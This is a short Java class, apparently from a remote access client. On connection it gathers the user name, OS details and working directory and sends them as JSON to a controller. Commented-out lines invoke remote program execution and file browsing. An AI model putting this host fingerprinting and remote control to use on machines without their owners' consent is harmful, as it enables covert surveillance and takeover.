package Classes;

import Classes.Instructions.*;

import com.google.gson.Gson;

import java.io.IOException;
import java.util.HashMap;

public class Initialize {
    public Gson json = new Gson();

    Initialize(Connection connection) throws IOException {
        String userName = System.getProperty("user.name");
        String osInformation = System.getProperty("os.name") + " | " +
                System.getProperty("os.version") + " | " +
                System.getProperty("os.arch");

        String dir = System.getProperty("user.dir");

        HashMap<String, String> information = new HashMap<String, String>();
        information.put("type", "connection");
        information.put("user", userName);
        information.put("os", osInformation);
        information.put("dir", dir);

        String toSend = json.toJson(information);

        System.out.println("New connection opened");
        System.out.println(toSend);

        connection.send(toSend);

        //Exec exec = new Exec(connection, new String[]{"notepad.exe"});
        //exec.execute();

        //FileViewer fview = new FileViewer(connection, new String[]{"C:/"});
        //fview.execute();
    }
}
